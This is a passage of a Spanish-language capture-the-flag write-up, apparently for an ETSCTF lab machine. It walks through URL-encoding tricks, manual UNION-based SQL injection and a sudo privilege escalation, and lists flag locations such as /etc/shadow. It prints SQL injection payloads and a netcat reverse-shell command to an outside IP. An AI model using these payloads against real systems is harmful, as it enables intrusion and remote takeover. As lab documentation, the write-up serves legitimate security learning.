+<p>Tanto con esa respuesta como al enviar nuevas rutas de prueba, se puede identificar que se está añadiendo un <code>/</code> a la ruta que se consulta, por lo que se puede buscar que no se interprete añadiendo un <code>#</code> al final como si se estuviera consultando un fragmento del sitio señalado. Ejemplo, en <code>https://book.hacktricks.xyz/welcome/readme#pentesting-methodology</code>, se está consultando el recurso readme y dentro de él se indica que se busca el fragmento <code>#pentesting-methodology</code> (véase <a href="https://www.w3.org/wiki/HashURI">W3C - Hash URI</a> y <a href="https://www.jenitennison.com/2011/03/06/hash-uris.html">Jeni Tennison - Hash URIs</a>).</p>
+<p>Al visualizar que no se interpréta aparentemente, se buscó usar url encoding en el <code>#</code> para ver si resultaba en un cambio <code>https://localhost.echocity-f.com/%23</code>, permitiendo así visualizar la ruta interna y una bandera.</p>
+<p><img alt="Visualización de ruta interna" src="images/exploit_2.png" /></p>
+<p>En este punto se intentó consultar ciertas rutas estándares que suelen ocupar en la plataforma, tales como <code>ETSCTF</code> o <code>ETSCTF.html</code>, identificando que con la segunda después de mandar la petición se creaba un elemento en la plataforma principal.</p>
+<p><img alt="Ejecución de template ETSCTF" src="images/exploit_3.png" /></p>
+<p>Y en el dashboard se puede visualizar un nuevo elemento.</p>
+<p><img alt="Nuevo elemento" src="images/exploit_4.png" /></p>
+<p>En este punto se intentó identificar una vulnerabilidad de tipo SSTI para los templates <code>.ejs</code> dado el output obtenido al enviar la petición a <code>ETSCTF.html</code> sin obtener éxito alguno. Por lo que se buscaron otras rutas disponibles en la plataforma, identificando:</p>
+<ul>
+<li><code>/add</code>.</li>
+<li><code>/edit</code>.</li>
+</ul>
+<p>En <code>/edit</code> al pasarle el id del elemento se pudieron visualizar sus valores. Ejemplo <code>https://localhost.echocity-f.com/edit?id=2</code>.</p>
+<p><img alt="Contenido de elemento 2" src="images/exploit_5.png" /></p>
+<p>Después al probar con <code>'</code> después del id <code>https://localhost.echocity-f.com/edit?id=2'</code> se identificó una excepción de SQL dándo paso a la siguiente fase de explotación.</p>
+<p><img alt="Excepción SQL" src="images/exploit_6.png" /></p>
+<h3 id="sqli">SQLi</h3>
+<p>Al requerir de una validación visual de inyección dado el escenario se realizo manualmente todo el proceso de inyección, buscando en primera instancia identificar el número de columnas en la tabla, mediante:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>id=2&#39; UNION SELECT 1,2,3,4,5-- -
+</span></code></pre></div>
+<p>Iterando de 1 a N hasta no obtener errores en la respuesta. Posteriormente, se buscó identificar cuál de las columnas permite desplegar cadenas de carácteres, identificando la segunda y tercera posición con (añadiendo un ordenamiento para ver el contenido en los inputs disponibles):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>id=2&#39; UNION SELECT 1,&#39;a&#39;,&#39;a&#39;,4,5 ORDER BY url ASC-- -
+</span></code></pre></div>
+<p><img alt="Identificación de columnas de cadenas de carácteres" src="images/exploit_7.png" /></p>
+<p>Podiendo visualizar la información se buscó identificar que usuario de base de datos estaba siendo usado para tratar de asumir con qué permisos se contaba. Usando:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>id=2&#39; UNION SELECT 1,user(),&#39;a&#39;,4,5 ORDER BY url ASC-- -
+</span></code></pre></div>
+<p><img alt="Usuario de base de datos" src="images/exploit_8.png" /></p>
+<p>Al identificar al usuario <code>root</code> se buscó ejecutar directamente una reverse shell con:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>id=2&#39; UNION SELECT 1,sys_exec(&#39;nc -e /bin/bash 10.10.0.50 1234&#39;),&#39;a&#39;,4,5-- -
+</span></code></pre></div>
+<p>Obteniendo así, acceso a la máquina.</p>
+<p><img alt="Acceso a máquina" src="images/exploit_9.png" /></p>
+<h2 id="post-explotacion">Post Explotación</h2>
+<h3 id="escalacion-de-privilegios">Escalación de privilegios</h3>
+<h4 id="mysql-root">mysql &rarr; root</h4>
+<p>Al ejecutar <code>sudo -l</code> se puede visualizar que el usuario no tiene restricción alguna para ejecutar binarios con <code>sudo</code>, por lo que al ejecutar <code>sudo bash</code>, se obtiene acceso como <code>root</code>.</p>
+<p><img alt="Acceso como root" src="images/post_1.png" /></p>
+<h2 id="ubicacion-de-banderas">Ubicación de banderas</h2>
+<ol>
+<li>(other: 100 pts x2) <code>/app/frontend/forms.html</code> x2.</li>
+<li>(other: 100 pts) <code>/app/frontend/forms.go</code>.</li>
+<li>(other: 100 pts) <code>/app/frontend/ETSCTF.html</code>.</li>
+<li>(other: 400 pts) <code>/app/backend/views/etsctf.ejs</code>.</li>
+<li>(other: 500 pts) mysql event (Revisar <a href="#eventos-mysql">eventos mysql</a>).</li>
+<li>(other: 300 pts) scrapper databases (visto desde la plataforma interna o dentro de la base de datos).</li>
+<li>(system: 1300 pts) <code>/etc/passwd</code>.</li>
+<li>(system: 1300 pts) <code>/etc/shadow</code>.</li>
+<li>(env: 900 pts) <code>strings /proc/1/environ | grep ETSCTF_</code>.</li>
+<li>(root: 1500 pts) <code>/root</code></li>
+</ol>
+<h2 id="notas-adicionales">Notas adicionales</h2>
+<h3 id="eventos-mysql">Eventos <code>mysql</code></h3>
+<p>Después de realizar búsquedas recursivas en los directorios que ocupan la intrusión, encontré la bandera en el archivo que se interpreta como binario <code>/var/lib/mysql/event.MYD</code>. Al realizar el submit de la misma me encontré que el nombre hace alusión a los eventos de MySQL, al no conocerlos decídi buscar información al repecto y la manera de consultarlos correctamente a través del cliente <code>mysql</code>. Encontrando que estos pueden ser configurados a través del <code>Event Scheduler</code> para ejecutar consultas definidas por el usuario para completar una tarea (algo similar a los cron jobs en linux). Permitiendo consultar su nombre y su contenido con:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>MariaDB<span class="w"> </span><span class="o">[(</span>none<span class="o">)]</span>&gt;<span class="w"> </span>use<span class="w"> </span>scrapper<span class="p">;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>use<span class="w"> </span>scrapper<span class="p">;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Reading<span class="w"> </span>table<span class="w"> </span>information<span class="w"> </span><span class="k">for</span><span class="w"> </span>completion<span class="w"> </span>of<span class="w"> </span>table<span class="w"> </span>and<span class="w"> </span>column<span class="w"> </span>names
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>You<span class="w"> </span>can<span class="w"> </span>turn<span class="w"> </span>off<span class="w"> </span>this<span class="w"> </span>feature<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>quicker<span class="w"> </span>startup<span class="w"> </span>with<span class="w"> </span>-A
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Database<span class="w"> </span>changed
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>MariaDB<span class="w"> </span><span class="o">[</span>scrapper<span class="o">]</span>&gt;<span class="w"> </span>show<span class="w"> </span>events<span class="se">\G</span><span class="w"> </span><span class="c1"># Para consultar los eventos configurados.</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>show<span class="w"> </span>events<span class="se">\G</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>***************************<span class="w"> </span><span class="m">1</span>.<span class="w"> </span>row<span class="w"> </span>***************************
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">                  </span>Db:<span class="w"> </span>scrapper
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">                </span>Name:<span class="w"> </span>ev_crawl_pending_queue
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">             </span>Definer:<span class="w"> </span>root@localhost
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">           </span>Time<span class="w"> </span>zone:<span class="w"> </span>SYSTEM
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="w">                </span>Type:<span class="w"> </span>RECURRING
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="w">          </span>Execute<span class="w"> </span>at:<span class="w"> </span>NULL
+</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="w">      </span>Interval<span class="w"> </span>value:<span class="w"> </span><span class="m">30</span>
+</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="w">      </span>Interval<span class="w"> </span>field:<span class="w"> </span>SECOND
+</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="w">              </span>Starts:<span class="w"> </span><span class="m">2019</span>-11-14<span class="w"> </span><span class="m">17</span>:32:37
+</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="w">                </span>Ends:<span class="w"> </span>NULL
+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="w">              </span>Status:<span class="w"> </span>ENABLED
+</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="w">          </span>Originator:<span class="w"> </span><span class="m">0</span>
+</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>character_set_client:<span class="w"> </span>utf8mb4
+</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>collation_connection:<span class="w"> </span>utf8mb4_general_ci
+</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a><span class="w">  </span>Database<span class="w"> </span>Collation:<span class="w"> </span>utf8mb4_general_ci
+</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="m">1</span><span class="w"> </span>row<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>
+</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>MariaDB<span class="w"> </span><span class="o">[</span>scrapper<span class="o">]</span>&gt;<span class="w"> </span>SHOW<span class="w"> </span>CREATE<span class="w"> </span>EVENT<span class="w"> </span>ev_crawl_pending_queue<span class="se">\G</span><span class="w"> </span><span class="c1"># Para ver el la configuración del evento seleccionado mediante su nombre.</span>
+</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>SHOW<span class="w"> </span>CREATE<span class="w"> </span>EVENT<span class="w"> </span>ev_crawl_pending_queue<span class="se">\G</span>
+</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>***************************<span class="w"> </span><span class="m">1</span>.<span class="w"> </span>row<span class="w"> </span>***************************
+</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a><span class="w">               </span>Event:<span class="w"> </span>ev_crawl_pending_queue
+</span><span id="__span-6-31"><a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a><span class="w">            </span>sql_mode:<span class="w"> </span>NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
+</span><span id="__span-6-32"><a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a><span class="w">           </span>time_zone:<span class="w"> </span>SYSTEM
+</span><span id="__span-6-33"><a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a><span class="w">        </span>Create<span class="w"> </span>Event:<span class="w"> </span>CREATE<span class="w"> </span><span class="nv">DEFINER</span><span class="o">=</span><span class="sb">`</span>root<span class="sb">`</span>@<span class="sb">`</span>localhost<span class="sb">`</span><span class="w"> </span>EVENT<span class="w"> </span><span class="sb">`</span>ev_crawl_pending_queue<span class="sb">`</span><span class="w"> </span>ON<span class="w"> </span>SCHEDULE<span class="w"> </span>EVERY<span class="w"> </span><span class="m">30</span><span class="w"> </span>SECOND<span class="w"> </span>STARTS<span class="w"> </span><span class="s1">&#39;2019-11-14 17:32:37&#39;</span><span class="w"> </span>ON<span class="w"> </span>COMPLETION<span class="w"> </span>NOT<span class="w"> </span>PRESERVE<span class="w"> </span>ENABLE<span class="w"> </span>COMMENT<span class="w"> </span><span class="s1">&#39;Check for commands that have no output ETSCTF_3f2652090448df5042&#39;</span><span class="w"> </span>DO<span class="w"> </span>BEGIN
+</span><span id="__span-6-34"><a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a><span class="w">  </span>DECLARE<span class="w"> </span>pid,done<span class="w"> </span>INT<span class="p">;</span>
+</span><span id="__span-6-35"><a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a><span class="w">  </span>DECLARE<span class="w"> </span>_pcur<span class="w"> </span>CURSOR<span class="w"> </span>FOR<span class="w"> </span>SELECT<span class="w"> </span>id<span class="w"> </span>FROM<span class="w"> </span>queue<span class="p">;</span>
+</span><span id="__span-6-36"><a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a><span class="w">  </span>DECLARE<span class="w"> </span>CONTINUE<span class="w"> </span>HANDLER<span class="w"> </span>FOR<span class="w"> </span>NOT<span class="w"> </span>FOUND<span class="w"> </span>SET<span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>TRUE<span class="p">;</span>
+</span><span id="__span-6-37"><a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a><span class="w">  </span>OPEN<span class="w"> </span>_pcur<span class="p">;</span>
+</span><span id="__span-6-38"><a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a><span class="w">  </span>read_loop:<span class="w"> </span>LOOP
+</span><span id="__span-6-39"><a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a><span class="w">    </span>FETCH<span class="w"> </span>_pcur<span class="w"> </span>INTO<span class="w"> </span>pid<span class="p">;</span>
+</span><span id="__span-6-40"><a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a><span class="w">    </span>IF<span class="w"> </span><span class="k">done</span><span class="w"> </span>THEN
+</span><span id="__span-6-41"><a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a><span class="w">      </span>LEAVE<span class="w"> </span>read_loop<span class="p">;</span>
+</span><span id="__span-6-42"><a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a><span class="w">    </span>END<span class="w"> </span>IF<span class="p">;</span>
+</span><span id="__span-6-43"><a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a><span class="w">  </span>IF<span class="w"> </span>@debug<span class="w"> </span>IS<span class="w"> </span>NOT<span class="w"> </span>NULL<span class="w"> </span>THEN
+</span><span id="__span-6-44"><a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a><span class="w">    </span>SELECT<span class="w"> </span>pid<span class="p">;</span>
+</span><span id="__span-6-45"><a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a><span class="w">  </span>END<span class="w"> </span>IF<span class="p">;</span>
+</span><span id="__span-6-46"><a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a><span class="w">  </span>UPDATE<span class="w"> </span>crawlers<span class="w"> </span>SET<span class="w"> </span><span class="nv">output</span><span class="o">=</span>sys_eval<span class="o">(</span>CONCAT<span class="o">(</span>command,<span class="w"> </span><span class="s1">&#39; &quot;&#39;</span>,<span class="w"> </span>url,<span class="s1">&#39;&quot;&#39;</span><span class="o">))</span><span class="w"> </span>WHERE<span class="w"> </span><span class="nv">id</span><span class="o">=</span>pid<span class="p">;</span>
+</span><span id="__span-6-47"><a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a><span class="w">  </span>DELETE<span class="w"> </span>FROM<span class="w"> </span>queue<span class="w"> </span>WHERE<span class="w"> </span><span class="nv">id</span><span class="o">=</span>pid<span class="p">;</span>
+</span><span id="__span-6-48"><a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a><span class="w">  </span>END<span class="w"> </span>LOOP<span class="p">;</span>
+</span><span id="__span-6-49"><a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a><span class="w">  </span>CLOSE<span class="w"> </span>_pcur<span class="p">;</span>
+</span><span id="__span-6-50"><a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a>END
+</span><span id="__span-6-51"><a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a>character_set_client:<span class="w"> </span>utf8mb4
+</span><span id="__span-6-52"><a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a>collation_connection:<span class="w"> </span>utf8mb4_general_ci
+</span><span id="__span-6-53"><a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a><span class="w">  </span>Database<span class="w"> </span>Collation:<span class="w"> </span>utf8mb4_general_ci
+</span><span id="__span-6-54"><a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a><span class="m">1</span><span class="w"> </span>row<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+</span></code></pre></div>
+<h2 id="referencias">Referencias</h2>
+<ul>
+<li><a href="https://es.wikipedia.org/wiki/Web_scraping">Definición Web Scrapping</a>.</li>
+<li><a href="https://www.w3.org/wiki/HashURI">W3C - Hash URI</a>.</li>
+<li><a href="https://www.jenitennison.com/2011/03/06/hash-uris.html">Jeni Tennison - Hash URIs</a>.</li>
+<li><a href="https://dev.mysql.com/doc/refman/5.7/en/event-scheduler.html">MySQL Reference Manual - Using the Event Scheduler</a>.</li>
+<li><a href="https://dev.mysql.com/doc/refman/5.7/en/show-events.html">MySQL Reference Manual - SHOW EVENTS Statement</a>.</li>
+<li><a href="https://dev.mysql.com/doc/refman/5.7/en/show-create-event.html">MySQL Reference Manual - SHOW CREATE EVENT Statement</a>.</li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Última actualización">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">27 de octubre de 2024</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.action.view", "content.code.copy", "navigation.top", "navigation.sections", "navigation.tracking", "navigation.indexes"], "search": "../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
